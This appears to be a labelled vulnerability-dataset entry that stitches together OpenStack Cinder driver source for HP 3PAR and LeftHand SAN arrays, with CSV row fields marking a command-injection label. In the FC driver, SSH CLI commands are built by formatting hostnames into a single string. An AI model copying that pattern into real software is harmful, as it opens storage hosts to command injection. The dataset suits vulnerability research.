#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
#
""""""
Volume driver for HP 3PAR Storage array.
This driver requires 3.1.2 MU2 firmware on the 3PAR array.

You will need to install the python hp3parclient.
sudo pip install hp3parclient

Set the following in the cinder.conf file to enable the
3PAR iSCSI Driver along with the required flags:

volume_driver=cinder.volume.drivers.san.hp.hp_3par_iscsi.HP3PARISCSIDriver
""""""

import sys

from hp3parclient import exceptions as hpexceptions

from cinder import exception
from cinder.openstack.common import log as logging
from cinder import utils
import cinder.volume.driver
from cinder.volume.drivers.san.hp import hp_3par_common as hpcommon
from cinder.volume.drivers.san import san

VERSION = 1.1
LOG = logging.getLogger(__name__)
DEFAULT_ISCSI_PORT = 3260


class HP3PARISCSIDriver(cinder.volume.driver.ISCSIDriver):
    """"""OpenStack iSCSI driver to enable 3PAR storage array.

    Version history:
        1.0 - Initial driver
        1.1 - QoS, extend volume, multiple iscsi ports, remove domain,
              session changes, faster clone, requires 3.1.2 MU2 firmware.

    """"""
    def __init__(self, *args, **kwargs):
        super(HP3PARISCSIDriver, self).__init__(*args, **kwargs)
        self.common = None
        self.configuration.append_config_values(hpcommon.hp3par_opts)
        self.configuration.append_config_values(san.san_opts)

    def _init_common(self):
        return hpcommon.HP3PARCommon(self.configuration)

    def _check_flags(self):
        """"""Sanity check to ensure we have required options set.""""""
        required_flags = ['hp3par_api_url', 'hp3par_username',
                          'hp3par_password', 'san_ip', 'san_login',
                          'san_password']
        self.common.check_flags(self.configuration, required_flags)

    @utils.synchronized('3par', external=True)
    def get_volume_stats(self, refresh):
        self.common.client_login()
        stats = self.common.get_volume_stats(refresh)
        stats['storage_protocol'] = 'iSCSI'
        backend_name = self.configuration.safe_get('volume_backend_name')
        stats['volume_backend_name'] = backend_name or self.__class__.__name__
        self.common.client_logout()
        return stats

    def do_setup(self, context):
        self.common = self._init_common()
        self._check_flags()

        # map iscsi_ip-> ip_port
        #             -> iqn
        #             -> nsp
        self.iscsi_ips = {}
        temp_iscsi_ip = {}

        # use the 3PAR ip_addr list for iSCSI configuration
        if len(self.configuration.hp3par_iscsi_ips) > 0:
            # add port values to ip_addr, if necessary
            for ip_addr in self.configuration.hp3par_iscsi_ips:
                ip = ip_addr.split(':')
                if len(ip) == 1:
                    temp_iscsi_ip[ip_addr] = {'ip_port': DEFAULT_ISCSI_PORT}
                elif len(ip) == 2:
                    temp_iscsi_ip[ip[0]] = {'ip_port': ip[1]}
                else:
                    msg = _(""Invalid IP address format '%s'"") % ip_addr
                    LOG.warn(msg)

        # add the single value iscsi_ip_address option to the IP dictionary.
        # This way we can see if it's a valid iSCSI IP. If it's not valid,
        # we won't use it and won't bother to report it, see below
        if (self.configuration.iscsi_ip_address not in temp_iscsi_ip):
            ip = self.configuration.iscsi_ip_address
            ip_port = self.configuration.iscsi_port
            temp_iscsi_ip[ip] = {'ip_port': ip_port}

        # get all the valid iSCSI ports from 3PAR
        # when found, add the valid iSCSI ip, ip port, iqn and nsp
        # to the iSCSI IP dictionary
        # ...this will also make sure ssh works.
        iscsi_ports = self.common.get_ports()['iSCSI']
        for (ip, iscsi_info) in iscsi_ports.iteritems():
            if ip in temp_iscsi_ip:
                ip_port = temp_iscsi_ip[ip]['ip_port']
                self.iscsi_ips[ip] = {'ip_port': ip_port,
                                      'nsp': iscsi_info['nsp'],
                                      'iqn': iscsi_info['iqn']
                                      }
                del temp_iscsi_ip[ip]

        # if the single value iscsi_ip_address option is still in the
        # temp dictionary it's because it defaults to $my_ip which doesn't
        # make sense in this context. So, if present, remove it and move on.
        if (self.configuration.iscsi_ip_address in temp_iscsi_ip):
            del temp_iscsi_ip[self.configuration.iscsi_ip_address]

        # lets see if there are invalid iSCSI IPs left in the temp dict
        if len(temp_iscsi_ip) > 0:
            msg = _(""Found invalid iSCSI IP address(s) in configuration ""
                    ""option(s) hp3par_iscsi_ips or iscsi_ip_address '%s.'"") % \
                   ("", "".join(temp_iscsi_ip))
            LOG.warn(msg)

        if not len(self.iscsi_ips) > 0:
            msg = _('At least one valid iSCSI IP address must be set.')
            raise exception.InvalidInput(reason=(msg))

        self.common.do_setup(context)

    def check_for_setup_error(self):
        """"""Returns an error if prerequisites aren't met.""""""
        self._check_flags()

    @utils.synchronized('3par', external=True)
    def create_volume(self, volume):
        self.common.client_login()
        metadata = self.common.create_volume(volume)
        self.common.client_logout()

        return {'metadata': metadata}

    @utils.synchronized('3par', external=True)
    def create_cloned_volume(self, volume, src_vref):
        """"""Clone an existing volume.""""""
        self.common.client_login()
        new_vol = self.common.create_cloned_volume(volume, src_vref)
        self.common.client_logout()

        return {'metadata': new_vol}

    @utils.synchronized('3par', external=True)
    def delete_volume(self, volume):
        self.common.client_login()
        self.common.delete_volume(volume)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def create_volume_from_snapshot(self, volume, snapshot):
        """"""
        Creates a volume from a snapshot.

        TODO: support using the size from the user.
        """"""
        self.common.client_login()
        metadata = self.common.create_volume_from_snapshot(volume, snapshot)
        self.common.client_logout()
        return {'metadata': metadata}

    @utils.synchronized('3par', external=True)
    def create_snapshot(self, snapshot):
        self.common.client_login()
        self.common.create_snapshot(snapshot)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def delete_snapshot(self, snapshot):
        self.common.client_login()
        self.common.delete_snapshot(snapshot)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def initialize_connection(self, volume, connector):
        """"""Assigns the volume to a server.

        Assign any created volume to a compute node/host so that it can be
        used from that host.

        This driver returns a driver_volume_type of 'iscsi'.
        The format of the driver data is defined in _get_iscsi_properties.
        Example return value:

            {
                'driver_volume_type': 'iscsi'
                'data': {
                    'target_discovered': True,
                    'target_iqn': 'iqn.2010-10.org.openstack:volume-00000001',
                    'target_protal': '127.0.0.1:3260',
                    'volume_id': 1,
                }
            }

        Steps to export a volume on 3PAR
          * Get the 3PAR iSCSI iqn
          * Create a host on the 3par
          * create vlun on the 3par
        """"""
        self.common.client_login()

        # we have to make sure we have a host
        host = self._create_host(volume, connector)

        # now that we have a host, create the VLUN
        vlun = self.common.create_vlun(volume, host)

        self.common.client_logout()

        iscsi_ip = self._get_iscsi_ip(host['name'])
        iscsi_ip_port = self.iscsi_ips[iscsi_ip]['ip_port']
        iscsi_target_iqn = self.iscsi_ips[iscsi_ip]['iqn']
        info = {'driver_volume_type': 'iscsi',
                'data': {'target_portal': ""%s:%s"" %
                         (iscsi_ip, iscsi_ip_port),
                         'target_iqn': iscsi_target_iqn,
                         'target_lun': vlun['lun'],
                         'target_discovered': True
                         }
                }
        return info

    @utils.synchronized('3par', external=True)
    def terminate_connection(self, volume, connector, **kwargs):
        """"""Driver entry point to unattach a volume from an instance.""""""
        self.common.client_login()
        self.common.terminate_connection(volume,
                                         connector['host'],
                                         connector['initiator'])
        self.common.client_logout()

    def _create_3par_iscsi_host(self, hostname, iscsi_iqn, domain, persona_id):
        """"""Create a 3PAR host.

        Create a 3PAR host, if there is already a host on the 3par using
        the same iqn but with a different hostname, return the hostname
        used by 3PAR.
        """"""
        cmd = ['createhost', '-iscsi', '-persona', persona_id, '-domain',
               domain, hostname, iscsi_iqn]
        out = self.common._cli_run(cmd)
        if out and len(out) > 1:
            return self.common.parse_create_host_error(hostname, out)
        return hostname

    def _modify_3par_iscsi_host(self, hostname, iscsi_iqn):
        # when using -add, you can not send the persona or domain options
        command = ['createhost', '-iscsi', '-add', hostname, iscsi_iqn]
        self.common._cli_run(command)

    def _create_host(self, volume, connector):
        """"""Creates or modifies existing 3PAR host.""""""
        # make sure we don't have the host already
        host = None
        hostname = self.common._safe_hostname(connector['host'])
        cpg = self.common.get_cpg(volume, allowSnap=True)
        domain = self.common.get_domain(cpg)
        try:
            host = self.common._get_3par_host(hostname)
            if not host['iSCSIPaths']:
                self._modify_3par_iscsi_host(hostname, connector['initiator'])
                host = self.common._get_3par_host(hostname)
        except hpexceptions.HTTPNotFound:
            # get persona from the volume type extra specs
            persona_id = self.common.get_persona_type(volume)
            # host doesn't exist, we have to create it
            hostname = self._create_3par_iscsi_host(hostname,
                                                    connector['initiator'],
                                                    domain,
                                                    persona_id)
            host = self.common._get_3par_host(hostname)

        return host

    @utils.synchronized('3par', external=True)
    def create_export(self, context, volume):
        pass

    @utils.synchronized('3par', external=True)
    def ensure_export(self, context, volume):
        pass

    @utils.synchronized('3par', external=True)
    def remove_export(self, context, volume):
        pass

    def _get_iscsi_ip(self, hostname):
        """"""Get an iSCSI IP address to use.

        Steps to determine which IP address to use.
          * If only one IP address, return it
          * If there is an active vlun, return the IP associated with it
          * Return IP with fewest active vluns
        """"""
        if len(self.iscsi_ips) == 1:
            return self.iscsi_ips.keys()[0]

        # if we currently have an active port, use it
        nsp = self._get_active_nsp(hostname)

        if nsp is None:
            # no active vlun, find least busy port
            nsp = self._get_least_used_nsp(self._get_iscsi_nsps())
            if nsp is None:
                msg = _(""Least busy iSCSI port not found, ""
                        ""using first iSCSI port in list."")
                LOG.warn(msg)
                return self.iscsi_ips.keys()[0]

        return self._get_ip_using_nsp(nsp)

    def _get_iscsi_nsps(self):
        """"""Return the list of candidate nsps.""""""
        nsps = []
        for value in self.iscsi_ips.values():
            nsps.append(value['nsp'])
        return nsps

    def _get_ip_using_nsp(self, nsp):
        """"""Return IP assiciated with given nsp.""""""
        for (key, value) in self.iscsi_ips.items():
            if value['nsp'] == nsp:
                return key

    def _get_active_nsp(self, hostname):
        """"""Return the active nsp, if one exists, for the given host.""""""
        result = self.common._cli_run(['showvlun', '-a', '-host', hostname])
        if result:
            # first line is header
            result = result[1:]
            for line in result:
                info = line.split("","")
                if info and len(info) > 4:
                    return info[4]

    def _get_least_used_nsp(self, nspss):
        """"""""Return the nsp that has the fewest active vluns.""""""
        # return only the nsp (node:server:port)
        result = self.common._cli_run(['showvlun', '-a', '-showcols', 'Port'])

        # count the number of nsps (there is 1 for each active vlun)
        nsp_counts = {}
        for nsp in nspss:
            # initialize counts to zero
            nsp_counts[nsp] = 0

        current_least_used_nsp = None
        if result:
            # first line is header
            result = result[1:]
            for line in result:
                nsp = line.strip()
                if nsp in nsp_counts:
                    nsp_counts[nsp] = nsp_counts[nsp] + 1

            # identify key (nsp) of least used nsp
            current_smallest_count = sys.maxint
            for (nsp, count) in nsp_counts.iteritems():
                if count < current_smallest_count:
                    current_least_used_nsp = nsp
                    current_smallest_count = count

        return current_least_used_nsp

    def extend_volume(self, volume, new_size):
        self.common.extend_volume(volume, new_size)
/n/n/ncinder/volume/drivers/san/hp_lefthand.py/n/n#    Copyright 2012 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
""""""
HP Lefthand SAN ISCSI Driver.

The driver communicates to the backend aka Cliq via SSH to perform all the
operations on the SAN.
""""""
from lxml import etree

from cinder import exception
from cinder.openstack.common import log as logging
from cinder.volume.drivers.san.san import SanISCSIDriver


LOG = logging.getLogger(__name__)


class HpSanISCSIDriver(SanISCSIDriver):
    """"""Executes commands relating to HP/Lefthand SAN ISCSI volumes.

    We use the CLIQ interface, over SSH.

    Rough overview of CLIQ commands used:

    :createVolume:    (creates the volume)

    :getVolumeInfo:    (to discover the IQN etc)

    :getClusterInfo:    (to discover the iSCSI target IP address)

    :assignVolumeChap:    (exports it with CHAP security)

    The 'trick' here is that the HP SAN enforces security by default, so
    normally a volume mount would need both to configure the SAN in the volume
    layer and do the mount on the compute layer.  Multi-layer operations are
    not catered for at the moment in the cinder architecture, so instead we
    share the volume using CHAP at volume creation time.  Then the mount need
    only use those CHAP credentials, so can take place exclusively in the
    compute layer.
    """"""

    device_stats = {}

    def __init__(self, *args, **kwargs):
        super(HpSanISCSIDriver, self).__init__(*args, **kwargs)
        self.cluster_vip = None

    def _cliq_run(self, verb, cliq_args, check_exit_code=True):
        """"""Runs a CLIQ command over SSH, without doing any result parsing""""""
        cmd_list = [verb]
        for k, v in cliq_args.items():
            cmd_list.append(""%s=%s"" % (k, v))

        return self._run_ssh(cmd_list, check_exit_code)

    def _cliq_run_xml(self, verb, cliq_args, check_cliq_result=True):
        """"""Runs a CLIQ command over SSH, parsing and checking the output""""""
        cliq_args['output'] = 'XML'
        (out, _err) = self._cliq_run(verb, cliq_args, check_cliq_result)

        LOG.debug(_(""CLIQ command returned %s""), out)

        result_xml = etree.fromstring(out)
        if check_cliq_result:
            response_node = result_xml.find(""response"")
            if response_node is None:
                msg = (_(""Malformed response to CLIQ command ""
                         ""%(verb)s %(cliq_args)s. Result=%(out)s"") %
                       {'verb': verb, 'cliq_args': cliq_args, 'out': out})
                raise exception.VolumeBackendAPIException(data=msg)

            result_code = response_node.attrib.get(""result"")

            if result_code != ""0"":
                msg = (_(""Error running CLIQ command %(verb)s %(cliq_args)s. ""
                         "" Result=%(out)s"") %
                       {'verb': verb, 'cliq_args': cliq_args, 'out': out})
                raise exception.VolumeBackendAPIException(data=msg)

        return result_xml

    def _cliq_get_cluster_info(self, cluster_name):
        """"""Queries for info about the cluster (including IP)""""""
        cliq_args = {}
        cliq_args['clusterName'] = cluster_name
        cliq_args['searchDepth'] = '1'
        cliq_args['verbose'] = '0'

        result_xml = self._cliq_run_xml(""getClusterInfo"", cliq_args)

        return result_xml

    def _cliq_get_cluster_vip(self, cluster_name):
        """"""Gets the IP on which a cluster shares iSCSI volumes""""""
        cluster_xml = self._cliq_get_cluster_info(cluster_name)

        vips = []
        for vip in cluster_xml.findall(""response/cluster/vip""):
            vips.append(vip.attrib.get('ipAddress'))

        if len(vips) == 1:
            return vips[0]

        _xml = etree.tostring(cluster_xml)
        msg = (_(""Unexpected number of virtual ips for cluster ""
                 "" %(cluster_name)s. Result=%(_xml)s"") %
               {'cluster_name': cluster_name, '_xml': _xml})
        raise exception.VolumeBackendAPIException(data=msg)

    def _cliq_get_volume_info(self, volume_name):
        """"""Gets the volume info, including IQN""""""
        cliq_args = {}
        cliq_args['volumeName'] = volume_name
        result_xml = self._cliq_run_xml(""getVolumeInfo"", cliq_args)

        # Result looks like this:
        #<gauche version=""1.0"">
        #  <response description=""Operation succeeded."" name=""CliqSuccess""
        #            processingTime=""87"" result=""0"">
        #    <volume autogrowPages=""4"" availability=""online"" blockSize=""1024""
        #       bytesWritten=""0"" checkSum=""false"" clusterName=""Cluster01""
        #       created=""2011-02-08T19:56:53Z"" deleting=""false"" description=""""
        #       groupName=""Group01"" initialQuota=""536870912"" isPrimary=""true""
        #       iscsiIqn=""iqn.2003-10.com.lefthandnetworks:group01:25366:vol-b""
        #       maxSize=""6865387257856"" md5=""9fa5c8b2cca54b2948a63d833097e1ca""
        #       minReplication=""1"" name=""vol-b"" parity=""0"" replication=""2""
        #       reserveQuota=""536870912"" scratchQuota=""4194304""
        #       serialNumber=""9fa5c8b2cca54b2948a63d833097e1ca0000000000006316""
        #       size=""1073741824"" stridePages=""32"" thinProvision=""true"">
        #      <status description=""OK"" value=""2""/>
        #      <permission access=""rw""
        #            authGroup=""api-34281B815713B78-(trimmed)51ADD4B7030853AA7""
        #            chapName=""chapusername"" chapRequired=""true"" id=""25369""
        #            initiatorSecret="""" iqn="""" iscsiEnabled=""true""
        #            loadBalance=""true"" targetSecret=""supersecret""/>
        #    </volume>
        #  </response>
        #</gauche>

        # Flatten the nodes into a dictionary; use prefixes to avoid collisions
        volume_attributes = {}

        volume_node = result_xml.find(""response/volume"")
        for k, v in volume_node.attrib.items():
            volume_attributes[""volume."" + k] = v

        status_node = volume_node.find(""status"")
        if status_node is not None:
            for k, v in status_node.attrib.items():
                volume_attributes[""status."" + k] = v

        # We only consider the first permission node
        permission_node = volume_node.find(""permission"")
        if permission_node is not None:
            for k, v in status_node.attrib.items():
                volume_attributes[""permission."" + k] = v

        LOG.debug(_(""Volume info: %(volume_name)s => %(volume_attributes)s"") %
                  {'volume_name': volume_name,
                   'volume_attributes': volume_attributes})
        return volume_attributes

    def create_volume(self, volume):
        """"""Creates a volume.""""""
        cliq_args = {}
        cliq_args['clusterName'] = self.configuration.san_clustername

        if self.configuration.san_thin_provision:
            cliq_args['thinProvision'] = '1'
        else:
            cliq_args['thinProvision'] = '0'

        cliq_args['volumeName'] = volume['name']
        if int(volume['size']) == 0:
            cliq_args['size'] = '100MB'
        else:
            cliq_args['size'] = '%sGB' % volume['size']

        self._cliq_run_xml(""createVolume"", cliq_args)

        volume_info = self._cliq_get_volume_info(volume['name'])
        cluster_name = volume_info['volume.clusterName']
        iscsi_iqn = volume_info['volume.iscsiIqn']

        #TODO(justinsb): Is this always 1? Does it matter?
        cluster_interface = '1'

        if not self.cluster_vip:
            self.cluster_vip = self._cliq_get_cluster_vip(cluster_name)
        iscsi_portal = self.cluster_vip + "":3260,"" + cluster_interface

        model_update = {}

        # NOTE(jdg): LH volumes always at lun 0 ?
        model_update['provider_location'] = (""%s %s %s"" %
                                             (iscsi_portal,
                                              iscsi_iqn,
                                              0))

        return model_update

    def create_volume_from_snapshot(self, volume, snapshot):
        """"""Creates a volume from a snapshot.""""""
        raise NotImplementedError()

    def create_snapshot(self, snapshot):
        """"""Creates a snapshot.""""""
        raise NotImplementedError()

    def delete_volume(self, volume):
        """"""Deletes a volume.""""""
        cliq_args = {}
        cliq_args['volumeName'] = volume['name']
        cliq_args['prompt'] = 'false'  # Don't confirm
        try:
            volume_info = self._cliq_get_volume_info(volume['name'])
        except exception.ProcessExecutionError:
            LOG.error(""Volume did not exist. It will not be deleted"")
            return
        self._cliq_run_xml(""deleteVolume"", cliq_args)

    def local_path(self, volume):
        msg = _(""local_path not supported"")
        raise exception.VolumeBackendAPIException(data=msg)

    def initialize_connection(self, volume, connector):
        """"""Assigns the volume to a server.

        Assign any created volume to a compute node/host so that it can be
        used from that host. HP VSA requires a volume to be assigned
        to a server.

        This driver returns a driver_volume_type of 'iscsi'.
        The format of the driver data is defined in _get_iscsi_properties.
        Example return value:

            {
                'driver_volume_type': 'iscsi'
                'data': {
                    'target_discovered': True,
                    'target_iqn': 'iqn.2010-10.org.openstack:volume-00000001',
                    'target_protal': '127.0.0.1:3260',
                    'volume_id': 1,
                }
            }

        """"""
        self._create_server(connector)
        cliq_args = {}
        cliq_args['volumeName'] = volume['name']
        cliq_args['serverName'] = connector['host']
        self._cliq_run_xml(""assignVolumeToServer"", cliq_args)

        iscsi_properties = self._get_iscsi_properties(volume)
        return {
            'driver_volume_type': 'iscsi',
            'data': iscsi_properties
        }

    def _create_server(self, connector):
        cliq_args = {}
        cliq_args['serverName'] = connector['host']
        out = self._cliq_run_xml(""getServerInfo"", cliq_args, False)
        response = out.find(""response"")
        result = response.attrib.get(""result"")
        if result != '0':
            cliq_args = {}
            cliq_args['serverName'] = connector['host']
            cliq_args['initiator'] = connector['initiator']
            self._cliq_run_xml(""createServer"", cliq_args)

    def terminate_connection(self, volume, connector, **kwargs):
        """"""Unassign the volume from the host.""""""
        cliq_args = {}
        cliq_args['volumeName'] = volume['name']
        cliq_args['serverName'] = connector['host']
        self._cliq_run_xml(""unassignVolumeToServer"", cliq_args)

    def get_volume_stats(self, refresh):
        if refresh:
            self._update_backend_status()

        return self.device_stats

    def _update_backend_status(self):
        data = {}
        backend_name = self.configuration.safe_get('volume_backend_name')
        data['volume_backend_name'] = backend_name or self.__class__.__name__
        data['driver_version'] = '1.0'
        data['reserved_percentage'] = 0
        data['storage_protocol'] = 'iSCSI'
        data['vendor_name'] = 'Hewlett-Packard'

        result_xml = self._cliq_run_xml(""getClusterInfo"", {})
        cluster_node = result_xml.find(""response/cluster"")
        total_capacity = cluster_node.attrib.get(""spaceTotal"")
        free_capacity = cluster_node.attrib.get(""unprovisionedSpace"")
        GB = 1073741824

        data['total_capacity_gb'] = int(total_capacity) / GB
        data['free_capacity_gb'] = int(free_capacity) / GB
        self.device_stats = data
/n/n/n",0,command_injection
7,65,c55589b131828f3a595903f6796cb2d0babb772f,"/cinder/volume/drivers/san/hp/hp_3par_fc.py/n/n# vim: tabstop=4 shiftwidth=4 softtabstop=4
#
#    (c) Copyright 2013 Hewlett-Packard Development Company, L.P.
#    All Rights Reserved.
#
#    Copyright 2012 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
#
""""""
Volume driver for HP 3PAR Storage array.
This driver requires 3.1.2 MU2 firmware on the 3PAR array.

You will need to install the python hp3parclient.
sudo pip install hp3parclient

Set the following in the cinder.conf file to enable the
3PAR Fibre Channel Driver along with the required flags:

volume_driver=cinder.volume.drivers.san.hp.hp_3par_fc.HP3PARFCDriver
""""""

from hp3parclient import exceptions as hpexceptions
from oslo.config import cfg

from cinder import exception
from cinder.openstack.common import log as logging
from cinder import utils
import cinder.volume.driver
from cinder.volume.drivers.san.hp import hp_3par_common as hpcommon
from cinder.volume.drivers.san import san

VERSION = 1.1
LOG = logging.getLogger(__name__)


class HP3PARFCDriver(cinder.volume.driver.FibreChannelDriver):
    """"""OpenStack Fibre Channel driver to enable 3PAR storage array.

    Version history:
        1.0 - Initial driver
        1.1 - QoS, extend volume, multiple iscsi ports, remove domain,
              session changes, faster clone, requires 3.1.2 MU2 firmware,
              copy volume <--> Image.
    """"""

    def __init__(self, *args, **kwargs):
        super(HP3PARFCDriver, self).__init__(*args, **kwargs)
        self.common = None
        self.configuration.append_config_values(hpcommon.hp3par_opts)
        self.configuration.append_config_values(san.san_opts)

    def _init_common(self):
        return hpcommon.HP3PARCommon(self.configuration)

    def _check_flags(self):
        """"""Sanity check to ensure we have required options set.""""""
        required_flags = ['hp3par_api_url', 'hp3par_username',
                          'hp3par_password',
                          'san_ip', 'san_login', 'san_password']
        self.common.check_flags(self.configuration, required_flags)

    @utils.synchronized('3par', external=True)
    def get_volume_stats(self, refresh):
        self.common.client_login()
        stats = self.common.get_volume_stats(refresh)
        stats['storage_protocol'] = 'FC'
        backend_name = self.configuration.safe_get('volume_backend_name')
        stats['volume_backend_name'] = backend_name or self.__class__.__name__
        self.common.client_logout()
        return stats

    def do_setup(self, context):
        self.common = self._init_common()
        self._check_flags()
        self.common.do_setup(context)

    def check_for_setup_error(self):
        """"""Returns an error if prerequisites aren't met.""""""
        self._check_flags()

    @utils.synchronized('3par', external=True)
    def create_volume(self, volume):
        self.common.client_login()
        metadata = self.common.create_volume(volume)
        self.common.client_logout()
        return {'metadata': metadata}

    @utils.synchronized('3par', external=True)
    def create_cloned_volume(self, volume, src_vref):
        self.common.client_login()
        new_vol = self.common.create_cloned_volume(volume, src_vref)
        self.common.client_logout()
        return {'metadata': new_vol}

    @utils.synchronized('3par', external=True)
    def delete_volume(self, volume):
        self.common.client_login()
        self.common.delete_volume(volume)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def create_volume_from_snapshot(self, volume, snapshot):
        """"""
        Creates a volume from a snapshot.

        TODO: support using the size from the user.
        """"""
        self.common.client_login()
        metadata = self.common.create_volume_from_snapshot(volume, snapshot)
        self.common.client_logout()
        return {'metadata': metadata}

    @utils.synchronized('3par', external=True)
    def create_snapshot(self, snapshot):
        self.common.client_login()
        self.common.create_snapshot(snapshot)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def delete_snapshot(self, snapshot):
        self.common.client_login()
        self.common.delete_snapshot(snapshot)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def initialize_connection(self, volume, connector):
        """"""Assigns the volume to a server.

        Assign any created volume to a compute node/host so that it can be
        used from that host.

        The  driver returns a driver_volume_type of 'fibre_channel'.
        The target_wwn can be a single entry or a list of wwns that
        correspond to the list of remote wwn(s) that will export the volume.
        Example return values:

            {
                'driver_volume_type': 'fibre_channel'
                'data': {
                    'target_discovered': True,
                    'target_lun': 1,
                    'target_wwn': '1234567890123',
                }
            }

            or

             {
                'driver_volume_type': 'fibre_channel'
                'data': {
                    'target_discovered': True,
                    'target_lun': 1,
                    'target_wwn': ['1234567890123', '0987654321321'],
                }
            }


        Steps to export a volume on 3PAR
          * Create a host on the 3par with the target wwn
          * Create a VLUN for that HOST with the volume we want to export.

        """"""
        self.common.client_login()
        # we have to make sure we have a host
        host = self._create_host(volume, connector)

        # now that we have a host, create the VLUN
        vlun = self.common.create_vlun(volume, host)

        ports = self.common.get_ports()

        self.common.client_logout()
        info = {'driver_volume_type': 'fibre_channel',
                'data': {'target_lun': vlun['lun'],
                         'target_discovered': True,
                         'target_wwn': ports['FC']}}
        return info

    @utils.synchronized('3par', external=True)
    def terminate_connection(self, volume, connector, **kwargs):
        """"""Driver entry point to unattach a volume from an instance.""""""
        self.common.client_login()
        self.common.terminate_connection(volume,
                                         connector['host'],
                                         connector['wwpns'])
        self.common.client_logout()

    def _create_3par_fibrechan_host(self, hostname, wwn, domain, persona_id):
        """"""Create a 3PAR host.

        Create a 3PAR host, if there is already a host on the 3par using
        the same wwn but with a different hostname, return the hostname
        used by 3PAR.
        """"""
        out = self.common._cli_run('createhost -persona %s -domain %s %s %s'
                                   % (persona_id, domain,
                                      hostname, "" "".join(wwn)), None)
        if out and len(out) > 1:
            return self.common.parse_create_host_error(hostname, out)

        return hostname

    def _modify_3par_fibrechan_host(self, hostname, wwn):
        # when using -add, you can not send the persona or domain options
        out = self.common._cli_run('createhost -add %s %s'
                                   % (hostname, "" "".join(wwn)), None)

    def _create_host(self, volume, connector):
        """"""Creates or modifies existing 3PAR host.""""""
        host = None
        hostname = self.common._safe_hostname(connector['host'])
        cpg = self.common.get_cpg(volume, allowSnap=True)
        domain = self.common.get_domain(cpg)
        try:
            host = self.common._get_3par_host(hostname)
            if not host['FCPaths']:
                self._modify_3par_fibrechan_host(hostname, connector['wwpns'])
                host = self.common._get_3par_host(hostname)
        except hpexceptions.HTTPNotFound as ex:
            # get persona from the volume type extra specs
            persona_id = self.common.get_persona_type(volume)
            # host doesn't exist, we have to create it
            hostname = self._create_3par_fibrechan_host(hostname,
                                                        connector['wwpns'],
                                                        domain,
                                                        persona_id)
            host = self.common._get_3par_host(hostname)

        return host

    @utils.synchronized('3par', external=True)
    def create_export(self, context, volume):
        pass

    @utils.synchronized('3par', external=True)
    def ensure_export(self, context, volume):
        pass

    @utils.synchronized('3par', external=True)
    def remove_export(self, context, volume):
        pass

    def extend_volume(self, volume, new_size):
        self.common.extend_volume(volume, new_size)
/n/n/n/cinder/volume/drivers/san/hp/hp_3par_iscsi.py/n/n# vim: tabstop=4 shiftwidth=4 softtabstop=4
#
#    (c) Copyright 2012-2013 Hewlett-Packard Development Company, L.P.
#    All Rights Reserved.
#
#    Copyright 2012 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
#
""""""
Volume driver for HP 3PAR Storage array.
This driver requires 3.1.2 MU2 firmware on the 3PAR array.

You will need to install the python hp3parclient.
sudo pip install hp3parclient

Set the following in the cinder.conf file to enable the
3PAR iSCSI Driver along with the required flags:

volume_driver=cinder.volume.drivers.san.hp.hp_3par_iscsi.HP3PARISCSIDriver
""""""

import sys

from hp3parclient import exceptions as hpexceptions

from cinder import exception
from cinder.openstack.common import log as logging
from cinder import utils
import cinder.volume.driver
from cinder.volume.drivers.san.hp import hp_3par_common as hpcommon
from cinder.volume.drivers.san import san

VERSION = 1.1
LOG = logging.getLogger(__name__)
DEFAULT_ISCSI_PORT = 3260


class HP3PARISCSIDriver(cinder.volume.driver.ISCSIDriver):
    """"""OpenStack iSCSI driver to enable 3PAR storage array.

    Version history:
        1.0 - Initial driver
        1.1 - QoS, extend volume, multiple iscsi ports, remove domain,
              session changes, faster clone, requires 3.1.2 MU2 firmware.

    """"""
    def __init__(self, *args, **kwargs):
        super(HP3PARISCSIDriver, self).__init__(*args, **kwargs)
        self.common = None
        self.configuration.append_config_values(hpcommon.hp3par_opts)
        self.configuration.append_config_values(san.san_opts)

    def _init_common(self):
        return hpcommon.HP3PARCommon(self.configuration)

    def _check_flags(self):
        """"""Sanity check to ensure we have required options set.""""""
        required_flags = ['hp3par_api_url', 'hp3par_username',
                          'hp3par_password', 'san_ip', 'san_login',
                          'san_password']
        self.common.check_flags(self.configuration, required_flags)

    @utils.synchronized('3par', external=True)
    def get_volume_stats(self, refresh):
        self.common.client_login()
        stats = self.common.get_volume_stats(refresh)
        stats['storage_protocol'] = 'iSCSI'
        backend_name = self.configuration.safe_get('volume_backend_name')
        stats['volume_backend_name'] = backend_name or self.__class__.__name__
        self.common.client_logout()
        return stats

    def do_setup(self, context):
        self.common = self._init_common()
        self._check_flags()

        # map iscsi_ip-> ip_port
        #             -> iqn
        #             -> nsp
        self.iscsi_ips = {}
        temp_iscsi_ip = {}

        # use the 3PAR ip_addr list for iSCSI configuration
        if len(self.configuration.hp3par_iscsi_ips) > 0:
            # add port values to ip_addr, if necessary
            for ip_addr in self.configuration.hp3par_iscsi_ips:
